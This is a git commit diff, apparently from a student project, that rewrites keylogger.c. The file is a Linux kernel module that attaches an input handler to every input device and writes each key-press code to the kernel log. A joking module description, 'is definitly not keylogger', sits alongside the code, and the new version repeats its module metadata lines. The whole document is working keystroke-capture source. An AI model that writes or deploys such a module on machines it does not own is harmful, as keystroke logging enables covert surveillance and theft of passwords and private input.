cb317dc0e3c6043539b3f481d07cb3b469e3d76e
Sadowski-Krystian <80521867+Sadowski-Krystian@users.noreply.github.com>
2024-11-23 13:55:14 +0100

    Add files via upload

--- keylogger.c
+++ keylogger.c
@@ -2,72 +2,70 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/input.h>
-#include <linux/hid.h>
-#include <linux/fs.h>
-#include <linux/uaccess.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("281443-279460");
 MODULE_DESCRIPTION("is definitly not keylogger");
 MODULE_VERSION("1.0");
 
-static struct input_handler my_handler;
-static struct input_device_id my_id_table[] = {
+static struct input_handler keylogger_handler;
+
+static bool keylogger_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
+    if (type == EV_KEY && value == 1) {
+        printk(KERN_INFO "Key pressed: %u\n", code);
+    }
+    return true;
+}
+
+static int keylogger_connect(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id) {
+    struct input_handle *handle;
+
+    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
+    if (!handle)
+        return -ENOMEM;
+
+    handle->dev = dev;
+    handle->handler = handler;
+    handle->name = "keylogger";
+
+    input_register_handle(handle);
+    input_open_device(handle);
+
+    return 0;
+}
+
+static void keylogger_disconnect(struct input_handle *handle) {
+    input_close_device(handle);
+    input_unregister_handle(handle);
+    kfree(handle);
+}
+
+static const struct input_device_id keylogger_ids[] = {
     { .driver_info = 1 },
     { },
 };
 
-static int my_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
-    if (type == EV_KEY) {
-        printk(KERN_INFO "Key %d %s\n", code, value ? "pressed" : "released");
-    }
-    return 0;
-}
+MODULE_DEVICE_TABLE(input, keylogger_ids);
 
-static int my_connect(struct input_handler *handler, struct input_device *dev) {
-    struct input_handle *handle;
-
-    handle = input_allocate_handle();
-    if (!handle)
-        return -ENOMEM;
-
-    handle->handler = handler;
-    handle->dev = dev;
-    handle->event = my_event;
-
-    return input_register_handle(handle);
-}
-
-static void my_disconnect(struct input_handle *handle) {
-    input_unregister_handle(handle);
-}
-
-static struct input_handler my_handler = {
-    .event = my_event,
-    .connect = my_connect,
-    .disconnect = my_disconnect,
-    .name = "my_keylogger",
-    .id_table = my_id_table,
+static struct input_handler keylogger_handler = {
+    .event = keylogger_event,
+    .connect = keylogger_connect,
+    .disconnect = keylogger_disconnect,
+    .name = "keylogger",
+    .id_table = keylogger_ids,
 };
 
-static int __init my_module_init(void) {
-    int result;
-
-    result = input_register_handler(&my_handler);
-    if (result) {
-        printk(KERN_ERR "Failed to register input handler\n");
-        return result;
-    }
-
-    printk(KERN_INFO "Keylogger module loaded\n");
-    return 0;
+static int __init keylogger_init(void) {
+    return input_register_handler(&keylogger_handler);
 }
 
-static void __exit my_module_exit(void) {
-    input_unregister_handler(&my_handler);
-    printk(KERN_INFO "Keylogger module unloaded\n");
+static void __exit keylogger_exit(void) {
+    input_unregister_handler(&keylogger_handler);
 }
 
-module_init(my_module_init);
-module_exit(my_module_exit);
+module_init(keylogger_init);
+module_exit(keylogger_exit);
 
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("YourName");
+MODULE_DESCRIPTION("Linux keylogger using input subsystem");
